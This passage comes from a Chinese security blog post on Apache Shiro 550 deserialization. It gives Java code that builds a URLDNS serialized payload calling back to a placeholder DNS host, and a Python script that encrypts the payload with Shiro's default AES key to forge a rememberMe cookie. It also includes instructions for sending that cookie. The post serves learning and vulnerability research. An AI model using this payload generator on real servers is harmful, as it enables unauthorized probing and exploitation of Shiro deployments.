+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads.util.Test;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.Test.util.Serialize.serialize;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.Test.util.Unserialize.unserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNSTest</span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception{</span><br><span class="line">      <span class="comment">// url为接收dns请求的url 自己修改</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">"xxx.com"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodeField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        hashcodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodeField.set(url,<span class="number">1234</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        hashcodeField.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这是根据shiro加密的逻辑写出的构造新payload的脚本：</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">     BS = AES.block_size</span><br><span class="line">     pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">     key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">     mode = AES.MODE_CBC</span><br><span class="line">     iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">     encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">     ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">     <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):</span><br><span class="line">    enc_data = base64.b64decode(enc_data)</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s : s[:-s[-<span class="number">1</span>]]</span><br><span class="line">    key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line">    plaintext = unpad(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    data = get_file_data(<span class="string">"ser.bin"</span>)</span><br><span class="line">    <span class="built_in">print</span>(aes_enc(data))</span><br></pre></td></tr></tbody></table></figure>
+
+<p>把ser.bin和脚本放在同一目录下运行脚本即可：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230608162831994.png"></p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230608162901350.png"></p>
+<p>替换Cookie进行发包，需要注意的是要将Cookie中的SessionId删除掉，否则Shiro会直接用Sessionid而不是rememberme：<br><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230608163110965.png"></p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230608163121777.png"></p>
+<p>关于如何通过cb链命令执行先🐦一手 有空补上来</p>
+
+            </div>
+
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#Shiro550反序列化</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/05/30/CommonsCollections-2-4-5-7/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">CommonsCollections 2+4+5+7</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI',
+              appKey: '7gIuYJ9YQk94en6wRudankYd',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'Hi speak something！',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('https://ycemvr5n.api.lncldglobal.com') {
+              config.serverURLs = 'https://ycemvr5n.api.lncldglobal.com'
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'y1zh3e7'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">Shiro550反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#URLDNS%E6%8E%A2%E6%B5%8BShiro550"><span class="nav-text">URLDNS探测Shiro550</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2023</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">y1zh3e7</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
